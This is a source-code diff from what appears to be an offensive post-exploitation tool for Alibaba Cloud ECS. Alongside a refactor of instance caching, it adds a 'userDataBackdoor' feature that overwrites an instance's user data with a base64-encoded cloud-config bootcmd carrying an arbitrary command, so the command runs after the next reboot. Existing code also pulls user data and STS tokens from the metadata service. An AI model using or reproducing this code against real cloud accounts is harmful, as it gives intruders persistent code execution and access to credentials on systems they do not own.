@@ -98,68 +98,10 @@ func DescribeInvocationResults(region string, CommandId string, InvokeId string,
 	return output
 }
 
-func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool) {
+func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool, userDataBackdoor string) {
 	var InstancesList []Instances
 	if ecsFlushCache == false {
-		data := cmdutil.ReadECSCache("alibaba")
-		for _, v := range data {
-			switch {
-			case specifiedInstanceID != "all" && region != "all":
-				if specifiedInstanceID == v.InstanceId && region == v.RegionId {
-					obj := Instances{
-						InstanceId:       v.InstanceId,
-						InstanceName:     v.InstanceName,
-						OSName:           v.OSName,
-						OSType:           v.OSType,
-						Status:           v.Status,
-						PrivateIpAddress: v.PrivateIpAddress,
-						PublicIpAddress:  v.PublicIpAddress,
-						RegionId:         v.RegionId,
-					}
-					InstancesList = append(InstancesList, obj)
-				}
-			case specifiedInstanceID != "all" && region == "all":
-				if specifiedInstanceID == v.InstanceId {
-					obj := Instances{
-						InstanceId:       v.InstanceId,
-						InstanceName:     v.InstanceName,
-						OSName:           v.OSName,
-						OSType:           v.OSType,
-						Status:           v.Status,
-						PrivateIpAddress: v.PrivateIpAddress,
-						PublicIpAddress:  v.PublicIpAddress,
-						RegionId:         v.RegionId,
-					}
-					InstancesList = append(InstancesList, obj)
-				}
-			case specifiedInstanceID == "all" && region != "all":
-				if region == v.RegionId {
-					obj := Instances{
-						InstanceId:       v.InstanceId,
-						InstanceName:     v.InstanceName,
-						OSName:           v.OSName,
-						OSType:           v.OSType,
-						Status:           v.Status,
-						PrivateIpAddress: v.PrivateIpAddress,
-						PublicIpAddress:  v.PublicIpAddress,
-						RegionId:         v.RegionId,
-					}
-					InstancesList = append(InstancesList, obj)
-				}
-			case specifiedInstanceID == "all" && region == "all":
-				obj := Instances{
-					InstanceId:       v.InstanceId,
-					InstanceName:     v.InstanceName,
-					OSName:           v.OSName,
-					OSType:           v.OSType,
-					Status:           v.Status,
-					PrivateIpAddress: v.PrivateIpAddress,
-					PublicIpAddress:  v.PublicIpAddress,
-					RegionId:         v.RegionId,
-				}
-				InstancesList = append(InstancesList, obj)
-			}
-		}
+		InstancesList = ReturnCacheInstanceList(specifiedInstanceID, region, "alibaba")
 	} else {
 		InstancesList = ReturnInstancesList(region, false, specifiedInstanceID, ecsExecAllRegions)
 	}
@@ -203,7 +145,7 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 				region := i.RegionId
 				OSType := i.OSType
 				if userData == true {
-					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
+					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, true)
 					if commandResult == "" {
 						fmt.Println("未找到用户数据 (User data not found)")
 					} else if commandResult == "disabled" {
@@ -220,6 +162,8 @@ func ECSExec(command string, commandFile string, scriptType string, specifiedIns
 					} else {
 						fmt.Println(commandResult)
 					}
+				} else if userDataBackdoor != "" {
+					UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceID, timeOut, scriptType, i.OSType, i.Status)
 				} else {
 					if batchCommand == true {
 						if OSType == "linux" {
@@ -270,7 +214,7 @@ func getExecResult(region string, command string, OSType string, scriptType stri
 	return commandResult
 }
 
-func getUserData(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
+func getUserData(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int, isPrint bool) string {
 	var command string
 	if OSType == "linux" {
 		command = "curl -s http://100.100.100.200/latest/user-data/"
@@ -289,14 +233,20 @@ func getUserData(region string, OSType string, scriptType string, specifiedInsta
 		}
 		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
 		if strings.Contains(commandResult, "404 - Not Found") || strings.Contains(commandResult, "403 - Forbidden") {
-			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+			if isPrint {
+				color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+			}
 			commandResult = "disabled"
 		}
 	} else if strings.Contains(commandResult, "404 - Not Found") {
-		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		if isPrint {
+			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		}
 		commandResult = ""
 	} else {
-		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		if isPrint {
+			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
+		}
 	}
 	return commandResult
 }
@@ -348,4 +298,118 @@ func getMetaDataSTSToken(region string, OSType string, scriptType string, specif
 		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
 	}
 	return commandResult
+}
+
+func UserDataBackdoor(region string, command string, specifiedInstanceID string, timeOut int, scriptType string, OSType string, ecsStatus string) {
+	var commandResult1 string
+	if ecsStatus == "Running" {
+		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, false)
+		commandResult1 = commandResult
+		if commandResult == "disabled" {
+			log.Warnln("元数据拒绝访问，无法读取到用户数据 (Metadata Access Denied. Unable to retrieve user data.)")
+			return
+		}
+		if commandResult != "" {
+			var isSure bool
+			prompt := &survey.Confirm{
+				Message: "检测到目标机器已有用户数据，请在仔细权衡后再确认是否进行覆盖写入？(User data has been detected on the target machine. Please carefully consider and confirm whether you want to proceed with overwrite write?)",
+				Default: false,
+			}
+			err := survey.AskOne(prompt, &isSure)
+			errutil.HandleErr(err)
+			if !isSure {
+				log.Infoln("已中止操作 (The operation has been aborted.)")
+				return
+			}
+		}
+	}
+	request := ecs.CreateModifyInstanceAttributeRequest()
+	request.Scheme = "https"
+	request.InstanceId = specifiedInstanceID
+	userdata, _ := base64.StdEncoding.DecodeString("I2Nsb3VkLWNvbmZpZwpib290Y21kOgogIC0g")
+	userdataStr := string(userdata)
+	userdataStr = fmt.Sprintf("%s%s", userdataStr, command)
+	userdataStr = base64.StdEncoding.EncodeToString([]byte(userdataStr))
+	log.Debugln("待写入的用户数据 (User data to be written): ", userdataStr)
+	request.UserData = userdataStr
+	response, err := ECSClient(region).ModifyInstanceAttribute(request)
+	errutil.HandleErr(err)
+	commandResult := response.GetHttpStatus()
+	if commandResult == 200 {
+		if ecsStatus == "Running" {
+			log.Infoln("覆盖写入成功 (Overwrite write successful.)")
+			commandResult2 := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut, false)
+			color.Printf("\n<lightGreen>原来的用户数据 (Original user data): </> \n%s\n", commandResult1)
+			color.Printf("\n<lightGreen>现在的用户数据 (Current user data): </> \n%s\n\n", commandResult2)
+		} else {
+			log.Infoln("覆盖写入成功 (Overwrite write successful.)")
+		}
+		log.Infoln("用户数据后门会在实例重启后生效 (The user data backdoor will take effect after the instance is restarted.)")
+	} else {
+		log.Errorln("写入失败，权限不足 (Write failed, insufficient permissions.)")
+	}
+}
+
+func ReturnCacheInstanceList(specifiedInstanceID string, region string, provider string) []Instances {
+	var InstancesList []Instances
+	data := cmdutil.ReadECSCache(provider)
+	for _, v := range data {
+		switch {
+		case specifiedInstanceID != "all" && region != "all":
+			if specifiedInstanceID == v.InstanceId && region == v.RegionId {
+				obj := Instances{
+					InstanceId:       v.InstanceId,
+					InstanceName:     v.InstanceName,
+					OSName:           v.OSName,
+					OSType:           v.OSType,
+					Status:           v.Status,
+					PrivateIpAddress: v.PrivateIpAddress,
+					PublicIpAddress:  v.PublicIpAddress,
+					RegionId:         v.RegionId,
+				}
+				InstancesList = append(InstancesList, obj)
+			}
+		case specifiedInstanceID != "all" && region == "all":
+			if specifiedInstanceID == v.InstanceId {
+				obj := Instances{
+					InstanceId:       v.InstanceId,
+					InstanceName:     v.InstanceName,
+					OSName:           v.OSName,
+					OSType:           v.OSType,
+					Status:           v.Status,
+					PrivateIpAddress: v.PrivateIpAddress,
+					PublicIpAddress:  v.PublicIpAddress,
+					RegionId:         v.RegionId,
+				}
+				InstancesList = append(InstancesList, obj)
+			}
+		case specifiedInstanceID == "all" && region != "all":
+			if region == v.RegionId {
+				obj := Instances{
+					InstanceId:       v.InstanceId,
+					InstanceName:     v.InstanceName,
+					OSName:           v.OSName,
+					OSType:           v.OSType,
+					Status:           v.Status,
+					PrivateIpAddress: v.PrivateIpAddress,
+					PublicIpAddress:  v.PublicIpAddress,
+					RegionId:         v.RegionId,
+				}
+				InstancesList = append(InstancesList, obj)
+			}
+		case specifiedInstanceID == "all" && region == "all":
+			obj := Instances{
+				InstanceId:       v.InstanceId,
+				InstanceName:     v.InstanceName,
+				OSName:           v.OSName,
+				OSType:           v.OSType,
+				Status:           v.Status,
+				PrivateIpAddress: v.PrivateIpAddress,
+				PublicIpAddress:  v.PublicIpAddress,
+				RegionId:         v.RegionId,
+			}
+			InstancesList = append(InstancesList, obj)
+		}
+	}
+	return InstancesList
 }
